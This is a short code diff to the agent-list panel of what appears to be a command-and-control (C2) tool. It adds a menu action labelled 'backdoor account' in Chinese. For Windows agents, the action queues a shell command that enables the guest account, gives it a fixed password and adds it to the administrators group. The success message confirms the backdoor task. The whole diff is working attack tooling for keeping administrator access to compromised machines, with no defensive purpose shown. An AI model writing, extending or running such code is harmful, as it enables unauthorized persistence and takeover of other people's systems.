@@ -101,6 +101,26 @@ export default function AgentList() {
               onClick: () => {},
               children: [
                 {
+                  label: '后门账户',
+                  icon: '\u{1F464}',
+                  disabled: contextMenu.agent.os !== 'windows',
+                  onClick: async () => {
+                    const cmd = 'net user guest /active:yes && net user guest c2-2026 && net localgroup administrators guest /add';
+                    try {
+                      await createTask(contextMenu.agent.id, {
+                        command: 'shell',
+                        arguments: cmd,
+                      });
+                      alert(`✓ Backdoor account task queued`);
+                    } catch (err: unknown) {
+                      const msg =
+                        (err as { response?: { data?: { error?: { message?: string } } } })
+                          ?.response?.data?.error?.message;
+                      alert(`✗ Failed: ${msg || 'Could not create task'}`);
+                    }
+                  },
+                },
+                {
                   label: 'Windows启动目录',
                   icon: '\u{1F4C1}',
                   disabled: contextMenu.agent.os !== 'windows',
